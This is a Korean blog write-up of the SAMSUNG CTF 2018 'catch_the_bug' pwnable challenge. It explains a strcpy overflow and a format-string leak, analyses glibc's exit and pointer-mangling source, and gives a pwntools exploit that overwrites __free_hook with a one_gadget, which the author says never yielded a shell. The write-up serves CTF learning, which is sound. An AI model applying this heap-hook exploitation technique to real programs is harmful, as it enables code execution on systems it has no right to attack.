---
title: SAMSUNG CTF 2018 - catch_the_bug
categories:
 - pwnable
tags: arbitrary_write, exit, free_hook, pwn
---

- Intruction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference

## Intruction

언제부터였는지는 모르겠지만 CTF 동향이 malloc을 사용하는 문제에서 malloc을 직접적으로 사용하지 않고 다른 함수 내부에서 사용하는 것을 이용하는것을 봤는데..

이 문제가 그런 유형의 문제중에 하나였다. 되게 내부 루틴에서 malloc사용해서 지지고 볶고 해서 쉘따는거..

지금 환경이 환경인지라.. 결과적으로는 익스를 성공하진 못했다.

glibc 버전 차이 때문에 one_gadget이 맞질 않는것으로 잠정적 결론을 지었다.

aws cloud9이랑 구름ide 두개를 사용해서 문제를 풀고 있는데 문제의 환경은 glibc-2.26인데 aws는 2.27, ide는 2.19를 사용하고 있다.

진짜 해당 바이너리에 다른 libc 버전을 적용하려고 한 일주일 넘게 찾아봤는데 다 되질 않았다.

cloud 서비스 자체가 docker형식이라 그런것같은데... 정확한 원인은 모르겠지만 libc 버전을 바꾸는 순간 쉘 명령어들이 작동이 안됬다.. ls, cat, vim 같은것들이..;;

해당 부분은 이미 포기해서 일단 one_gadget이 실행되는 부분까지는 진행을 했다.

이 점을 염두해두고 글을 읽어주길 바란다. ^_^


## Vunlnerability

```
 ██████╗ █████╗ ███████╗ ██████╗██╗  ██╗
██╔════╝██╔══██╗╚═██╔══╝██╔════╝██║  ██║
██║     ███████║  ██║   ██║     ███████║
██║     ██╔══██║  ██║   ██║     ██╔══██║
╚██████╗██║  ██║  ██║   ╚██████╗██║  ██║
 ╚═════╝╚═╝  ╚═╝  ╚═╝    ╚═════╝╚═╝  ╚═╝
███████╗██╗  ██╗███████╗
╚═██╔══╝██║  ██║██╔════╝
  ██║   ███████║███████╗
  ██║   ██╔══██║██╔════╝
  ██║   ██║  ██║███████╗
  ╚═╝   ╚═╝  ╚═╝╚══════╝
██████╗ ██╗  ██╗ █████╗
██╔══██╗██║  ██║██╔═══╝
██████╔╝██║  ██║██║ ███╗
██╔══██╗██║  ██║██║  ██║
██████╔╝╚█████╔╝╚█████╔╝
╚═════╝  ╚════╝  ╚════╝

------------------------
-     Program Menu     -
------------------------
- 1. Catch a bug       -
- 2. Inspect the bug   -
- 3. Submit a repport  -
- 0. Exit              -
------------------------
>>
```

바이너리를 실행하면 이렇게 나오는데 취약점은 3번에서 발생된다.

1번에서 벌레를 3마리까지 잡을 수 있는데 해당 벌레의 string을 3번에서 전역변수에 `strcpy`로 복사를 해버린다.

여기서 전역변수에 overflow가 일어나고 그 뒤에 있던 pointer를 input으로 덮을 수 있게 되면서 tag와 password를 입력하는 부분에서 원하는 곳에 원하는 값을 2번 쓸 수 있다.

2번에서 FSB를 이용해서 leak이 가능하다.(벌레 이름을 `%p`로 하면 됨)


## Exploit


위에서 말했다시피 1번에서 bug를 찾아서 name을 `%p`로 지정해준뒤 2번에서 FSB가 일어나면서 libc leak이 일어난다.

문제는 여기서부터다. 위에서 언급했는데 쓰기가 2번이 가능한데 대체 어디다가 쓸것인가가 문제이다.

답은 exit함수 내부에 있다. 3번을 실행하고 바이너리가 종료되는데 main함수를 실행시켜주는 `__libc_start_main`를 살펴보면

```c
# define LIBC_START_MAIN __libc_start_main

STATIC int
LIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL),
                 int argc, char **argv,
#ifdef LIBC_START_MAIN_AUXVEC_ARG
                 ElfW(auxv_t) *auxvec,
#endif
                 __typeof (main) init,
                 void (*fini) (void),
                 void (*rtld_fini) (void), void *stack_end)
{
  /* Result of the 'main' function.  */
  int result;
  __libc_multiple_libcs = &_dl_starting_up && !_dl_starting_up;
#ifndef SHARED
  _dl_relocate_static_pie ();
  char **ev = &argv[argc + 1];
  __environ = ev;
  /* Store the lowest stack address.  This is done in ld.so if this is
     the code for the DSO.  */
  __libc_stack_end = stack_end;
# ifdef HAVE_AUX_VECTOR
  /* First process the auxiliary vector since we need to find the
     program header to locate an eventually present PT_TLS entry.  */
#  ifndef LIBC_START_MAIN_AUXVEC_ARG
  ElfW(auxv_t) *auxvec;
  {
    char **evp = ev;
    while (*evp++ != NULL)
      ;
    auxvec = (ElfW(auxv_t) *) evp;
  }
#  endif
  _dl_aux_init (auxvec);
  if (GL(dl_phdr) == NULL)
# endif
    {
      /* Starting from binutils-2.23, the linker will define the
         magic symbol __ehdr_start to point to our own ELF header
         if it is visible in a segment that also includes the phdrs.
         So we can set up _dl_phdr and _dl_phnum even without any
         information from auxv.  */
      extern const ElfW(Ehdr) __ehdr_start
        __attribute__ ((weak, visibility ("hidden")));
      if (&__ehdr_start != NULL)
        {
          assert (__ehdr_start.e_phentsize == sizeof *GL(dl_phdr));
          GL(dl_phdr) = (const void *) &__ehdr_start + __ehdr_start.e_phoff;
          GL(dl_phnum) = __ehdr_start.e_phnum;
        }
    }
  /* Initialize very early so that tunables can use it.  */
  __libc_init_secure ();
  __tunables_init (__environ);
  ARCH_INIT_CPU_FEATURES ();
  /* Perform IREL{,A} relocations.  */
  ARCH_SETUP_IREL ();
  /* The stack guard goes into the TCB, so initialize it early.  */
  ARCH_SETUP_TLS ();
  /* In some architectures, IREL{,A} relocations happen after TLS setup in
     order to let IFUNC resolvers benefit from TCB information, e.g. powerpc's
     hwcap and platform fields available in the TCB.  */
  ARCH_APPLY_IREL ();
  /* Set up the stack checker's canary.  */
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
# ifdef THREAD_SET_STACK_GUARD
  THREAD_SET_STACK_GUARD (stack_chk_guard);
# else
  __stack_chk_guard = stack_chk_guard;
# endif
# ifdef DL_SYSDEP_OSCHECK
  if (!__libc_multiple_libcs)
    {
      /* This needs to run to initiliaze _dl_osversion before TLS
         setup might check it.  */
      DL_SYSDEP_OSCHECK (__libc_fatal);
    }
# endif
  /* Initialize libpthread if linked in.  */
  if (__pthread_initialize_minimal != NULL)
    __pthread_initialize_minimal ();
  /* Set up the pointer guard value.  */
  uintptr_t pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,
                                                         stack_chk_guard);
# ifdef THREAD_SET_POINTER_GUARD
  THREAD_SET_POINTER_GUARD (pointer_chk_guard);
# else
  __pointer_chk_guard_local = pointer_chk_guard;
# endif
#endif /* !SHARED  */
  /* Register the destructor of the dynamic linker if there is any.  */
  if (__glibc_likely (rtld_fini != NULL))
    __cxa_atexit ((void (*) (void *)) rtld_fini, NULL, NULL);
#ifndef SHARED
  /* Call the initializer of the libc.  This is only needed here if we
     are compiling for the static library in which case we haven't
     run the constructors in `_dl_start_user'.  */
  __libc_init_first (argc, argv, __environ);
  /* Register the destructor of the program, if any.  */
  if (fini)
    __cxa_atexit ((void (*) (void *)) fini, NULL, NULL);
  /* Some security at this point.  Prevent starting a SUID binary where
     the standard file descriptors are not opened.  We have to do this
     only for statically linked applications since otherwise the dynamic
     loader did the work already.  */
  if (__builtin_expect (__libc_enable_secure, 0))
    __libc_check_standard_fds ();
#endif
  /* Call the initializer of the program, if any.  */
#ifdef SHARED
  if (__builtin_expect (GLRO(dl_debug_mask) & DL_DEBUG_IMPCALLS, 0))
    GLRO(dl_debug_printf) ("\ninitialize program: %s\n\n", argv[0]);
#endif
  if (init)
    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);
#ifdef SHARED
  /* Auditing checkpoint: we have a new object.  */
  if (__glibc_unlikely (GLRO(dl_naudit) > 0))
    {
      struct audit_ifaces *afct = GLRO(dl_audit);
      struct link_map *head = GL(dl_ns)[LM_ID_BASE]._ns_loaded;
      for (unsigned int cnt = 0; cnt < GLRO(dl_naudit); ++cnt)
        {
          if (afct->preinit != NULL)
            afct->preinit (&head->l_audit[cnt].cookie);
          afct = afct->next;
        }
    }
#endif
#ifdef SHARED
  if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_IMPCALLS))
    GLRO(dl_debug_printf) ("\ntransferring control: %s\n\n", argv[0]);
#endif
#ifndef SHARED
  _dl_debug_initialize (0, LM_ID_BASE);
#endif
#ifdef HAVE_CLEANUP_JMP_BUF
  /* Memory for the cancellation buffer.  */
  struct pthread_unwind_buf unwind_buf;
  int not_first_call;
  not_first_call = setjmp ((struct __jmp_buf_tag *) unwind_buf.cancel_jmp_buf);
  if (__glibc_likely (! not_first_call))
    {
      struct pthread *self = THREAD_SELF;
      /* Store old info.  */
      unwind_buf.priv.data.prev = THREAD_GETMEM (self, cleanup_jmp_buf);
      unwind_buf.priv.data.cleanup = THREAD_GETMEM (self, cleanup);
      /* Store the new cleanup handler info.  */
      THREAD_SETMEM (self, cleanup_jmp_buf, &unwind_buf);
      /* Run the program.  */
      result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);
    }
  else
    {
      /* Remove the thread-local data.  */
# ifdef SHARED
      PTHFCT_CALL (ptr__nptl_deallocate_tsd, ());
# else
      extern void __nptl_deallocate_tsd (void) __attribute ((weak));
      __nptl_deallocate_tsd ();
# endif
      /* One less thread.  Decrement the counter.  If it is zero we
         terminate the entire process.  */
      result = 0;
# ifdef SHARED
      unsigned int *ptr = __libc_pthread_functions.ptr_nthreads;
#  ifdef PTR_DEMANGLE
      PTR_DEMANGLE (ptr);
#  endif
# else
      extern unsigned int __nptl_nthreads __attribute ((weak));
      unsigned int *const ptr = &__nptl_nthreads;
# endif
      if (! atomic_decrement_and_test (ptr))
        /* Not much left to do but to exit the thread, not the process.  */
        __exit_thread ();
    }
#else
  /* Nothing fancy, just call the function.  */
  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);
#endif
  exit (result);
}

```

마지막에 보면 main의 return값을 `exit`함수의 인자로 넣고 `exit`함수를 실행시키게 된다.

`exit`함수를 살펴보자.

`exit`

```c

void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
libc_hidden_def (exit)


void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
                     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();
  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur;
      __libc_lock_lock (__exit_funcs_lock);
    restart:
      cur = *listp;
      if (cur == NULL)
        {
          /* Exit processing complete.  We will not allow any more
             atexit/on_exit registrations.  */
          __exit_funcs_done = true;
          __libc_lock_unlock (__exit_funcs_lock);
          break;
        }
      while (cur->idx > 0)
        {
          struct exit_function *const f = &cur->fns[--cur->idx];
          const uint64_t new_exitfn_called = __new_exitfn_called;
          /* Unlock the list while we call a foreign function.  */
          __libc_lock_unlock (__exit_funcs_lock);
          switch (f->flavor)
            {
              void (*atfct) (void);
              void (*onfct) (int status, void *arg);
              void (*cxafct) (void *arg, int status);
            case ef_free:
            case ef_us:
              break;
            case ef_on:
              onfct = f->func.on.fn;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (onfct);
#endif
              onfct (status, f->func.on.arg);
              break;
            case ef_at:
              atfct = f->func.at;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (atfct);
#endif
              atfct ();
              break;
            case ef_cxa:
              /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                 we must mark this function as ef_free.  */
              f->flavor = ef_free;
              cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (cxafct);
#endif
              cxafct (f->func.cxa.arg, status);
              break;
            }
          /* Re-lock again before looking at global state.  */
          __libc_lock_lock (__exit_funcs_lock);
          if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
            /* The last exit function, or another thread, has registered
               more exit functions.  Start the loop over.  */
            goto restart;
        }
      *listp = cur->next;
      if (*listp != NULL)
        /* Don't free the last element in the chain, this is the statically
           allocate element.  */
        free (cur);
      __libc_lock_unlock (__exit_funcs_lock);
    }
  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());
  _exit (status);
}

```

`exit`내부에서 `__run_exit_handlers`를 호출해서 처리를 진행하는데 여기서 제일 아래쪽으로 보면 `free (cur)`을 실행하는 것을 볼 수 있다.

해당 구문으로 들어가기 위해서는 두가지 조건을 만족해야된다.

1. cur->next != NULL
2. cur->idx <= 0

여기서 이제 `cur` 변수가 어떤 값인지 살펴보자.


```c
__run_exit_handlers (status, &__exit_funcs, true, true);


__run_exit_handlers (int status, struct exit_function_list **listp,
                     bool run_list_atexit, bool run_dtors)

cur = *listp;
```

결국 `cur`의 초기값은 `__exit_funcs`의 주소가 된다.

```c
static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &initial;
```

`cxa_atexit.c` 소스코드를 보면 `__exit_funcs`의 값에 `initial`의 주소를 넣는다. 정리하자면 `cur`의 초기값은 결국 `initial`의 주소라는 것이다.

따라서 1, 2번의 조건은 

1. initial->next != NULL
2. initial->idx <= 0 

정도로 생각할 수 있다. 그러니까 전역변수인 `initial`의 next와 idx의 값을 조작하고 `__free_hook`의 값을 one_gadget으로 설정해주면 `exit`함수를 호출해서 쉘을 얻을 수 있게 된다.

`exit` 내부 소스를 확인하면 while문 안에 switch로 무언가를 실행하는 것을 볼 수 있다. 정상적인 `exit`의 흐름일때 

```c
case ef_cxa:
              /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                 we must mark this function as ef_free.  */
              f->flavor = ef_free;
              cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (cxafct);
#endif
              cxafct (f->func.cxa.arg, status);
              break;
```

이부분을 실행하게 되는데 여기서 의문이 들었던 것이 그냥 `f->func.cxa.fn`의 값을 `system`의 주소로 쓰고, `f->func.cxa.arg`에 `/bin/sh`을 넣으면 안되는 것인가? 해서 해보니까 안된다.

`PTR_DEMANGLE`이라는 매크로 때문인데 해당 매크로에 `f->func.cxa.fn`를 인자로 넣는것을 볼 수 있다. 매크로 내용을 살펴보면

```c
# ifdef __ASSEMBLER__
#  define PTR_MANGLE(reg)        xor %fs:POINTER_GUARD, reg;                      \
                                rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)        ror $2*LP_SIZE+1, reg;                              \
                                xor %fs:POINTER_GUARD, reg
# else
#  define PTR_MANGLE(var)        asm ("xor %%fs:%c2, %0\n"                      \
                                     "rol $2*" LP_SIZE "+1, %0"                      \
                                     : "=r" (var)                              \
                                     : "0" (var),                              \
                                       "i" (offsetof (tcbhead_t,              \
                                                      pointer_guard)))
#  define PTR_DEMANGLE(var)        asm ("ror $2*" LP_SIZE "+1, %0\n"              \
                                     "xor %%fs:%c2, %0"                              \
                                     : "=r" (var)                              \
                                     : "0" (var),                              \
                                       "i" (offsetof (tcbhead_t,              \
                                                      pointer_guard)))
```

... 그렇다. 바이너리를 실행할때 마다 커널에서 주는 난수 `pointer_guard`를 가지고 xor연산을 한다. 이 문제에서는 `pointer_guard`의 값을 알아내는 방법이 없으므로 `f->func.cxa.fn`을 사용하여 익스를 진행하는 것은 문제가 있다.

뭐 결론적으로 이렇게 `__free_hook`의 값과 `initial->next`, `initial->idx`의 값을 조작해주면 쉘을 얻을 수 있다. 한 가지 짚고 넘어가야되는 것은 `initial->idx`는 조작을 하지 않아도 코드 흐름상 `ef_cxa` case에서 `cxafct` 함수를 실행한 후, `cur->idx`의 값이 0이 되면서 while문을 빠져나가 `free(cur)`이 실행될줄 알았다. 하지만 `cxafct`가 호출되는 순간 `intial`의 조작된 값이 다른 변수에 영향을 주면서 참조할 수 없는 주소를 가리키게 되면서 바이너리가 죽는 현상이 계속 발견됬다.

`__cxa_finialize` 함수에서 segmentation fault 에러가 계속 떠서 분석해보니

`cxa_finialize.c`

```c
void
__cxa_finalize (void *d)
{
  struct exit_function_list *funcs;
  __libc_lock_lock (__exit_funcs_lock);
 restart:
  for (funcs = __exit_funcs; funcs; funcs = funcs->next)
    {
      struct exit_function *f;
      for (f = &funcs->fns[funcs->idx - 1]; f >= &funcs->fns[0]; --f)
        if ((d == NULL || d == f->func.cxa.dso_handle) && f->flavor == ef_cxa)
          {
            const uint64_t check = __new_exitfn_called;
            void (*cxafn) (void *arg, int status) = f->func.cxa.fn;
            void *cxaarg = f->func.cxa.arg;
			
			.
			.
			.

```

여기서 `restart:` 바로 아래의 for문을 살펴보면 `funcs` 변수의 초기화를 `__exit_funcs`으로 해주는데 해당 값은 `initial`을 담고 있기 때문에 결국에 `funcs`변수에 조작된 `initial->next`의 값이 들어가게 되면서 참조할 수 없는 주소를 참조하게 된다.

따라서 해당 익스를 진행할때 `initial->next`와 `initial->idx` 둘다 조작을 진행해서 while문을 돌지 않고 바로 `free`함수를 호출하게끔 익스를 진행하거나 `intial->fns[--cur->idx]->flavor`의 값을 조작해서 `ef_cxa` case에 들어가지 못하게 만들어주면 되겠다.

필자는 첫번째 방법으로 익스를 진행했지만 위에서 언급했다시피 쉘은 따지 못했다.

~~정말 찝찝하다..~~

(libc 버전이 2.26이 아니여서 onegadget 조건을 충족하지 못했다..)

## slv.py

```python
from pwn import *

p = process('./bug')
e = ELF('./bug')

system_offset = e.libc.symbols['system']
binsh_offset = 0x1b3e9a
free_hook_offset = e.libc.symbols['__free_hook']
initial_offset = 0x3ecd80
onegadget = [0x4f2c5, 0x4f322, 0x10a38c]

sla = lambda c,s : p.sendlineafter(c, str(s))
sa = lambda c,s : p.sendafter (c, str(s))
sl = lambda s : p.sendline(str(s))
s = lambda s : p.send(str(s))

str_bug = {'dragonfly' : 0x1b8, 'butterfly': 0x1fe, 'fly':0x1c0}
catch_bug = []
count = 0

context.log_level = 'debug'
context.terminal = ['/usr/bin/tmux', 'splitw', '-h']



def catch():
    
    global count
    
    sla('>> ', '1')
    
    p.recvuntil('\n')
    if 'no bug' in str(p.recvuntil('\n')):
        
        return False
    
    bug = str(p.recvuntil('>> '))
    
    sl('%p')
    
    
    
    if '@@@@@' in bug:
        catch_bug.append('fly')
    
    elif '|:::|' in bug:
        catch_bug.append('butterfly')
    
    elif '###' in bug:
        catch_bug.append('dragonfly')
    
    count += 1
    
    return True

def inspect():
    
    sla('>> ', '2')
    
    libc_leak = int(str(p.recv(50)).split('=========================\n')[1][:14],16)
    
    libc_base = libc_leak - 0x3ec7e3
    log.info('libc_base : ' + hex(libc_base))
    
    return libc_base

def submit(body, tag, password):
    
    
    
    sla('>> ', '3')
    
    sla('title\n', 'a'*0x37)
    
    sla('title\n', 'a'*0x77)
    
    sla('body\n', body)
    
    sa('tag\n', tag)
    
    sa('password\n', password)
    
    
    return


def main():
    
    global count, catch_bug, str_bug
    
    while count != 3:
        catch()
    
    
    dummy_len = 0
    
    for i in catch_bug:
        dummy_len += str_bug[i]
        
    if dummy_len < 0x540:
        log.info('[-] Length of dummy is too short to exploit')
        return
    
    libc_base = inspect()
    
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + binsh_offset
    free_hook_addr = libc_base + free_hook_offset
    initial_addr = libc_base + initial_offset
    onegadget_addr = libc_base + onegadget[0]
    
    script = 'b* ' + hex(onegadget_addr)
    script += '''
    b* exit
    dir /usr/src/glibc/glibc-2.27/stdlib/
    '''
        
    payload = ''
    payload += 'a' * (0x700 - dummy_len - 0xc0)
    payload += p64(free_hook_addr-len(payload)-0x10-1)
    payload += p64(initial_addr+1)
    gdb.attach(p,script)
    submit(payload, p64(onegadget_addr), p64(1))
    
    p.interactive()
    
    return



if __name__ == '__main__':    
    main()
	
```

libc-2.27.so 버전의 익스이다. (쉘은 안따져용.. ㅠㅡㅠ)

onegadget이 안먹히길래 `system('/bin/sh')`을 실행시키려고 별의 별짓을 해봤는데도 안됬다.. ~~(능력부족)~~

^_^

## 느낀 점

1. exit 내부에 free를 호출하는 것처럼 다른 함수에서 내부적으로 malloc, free를 호출하는 것을 이용해 문제를 내는 유형이 있으므로 malloc, free를 사용하지 않는다고 해서 hook overwrite로 쉘을 따는 것이 아니라고 단정지을 수 없다.

2. PTR_MANGLE, PTR_DEMANGLE 의 존재를 이번에 처음 알았다. pointer_guard가 이런 식으로도 사용된다는 것을 알게되었다.

3. linux asm() 함수 형식에 대해서 제대로 알아야겠다..



## Reference

- [https://code.woboq.org/userspace/glibc/stdlib/exit.c.html](https://code.woboq.org/userspace/glibc/stdlib/exit.c.html)
- [https://code.woboq.org/userspace/glibc/stdlib/cxa_atexit.c.html#__exit_funcs](https://code.woboq.org/userspace/glibc/stdlib/cxa_atexit.c.html#__exit_funcs)
- [https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/sysdep.h.html#416](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/sysdep.h.html#416)









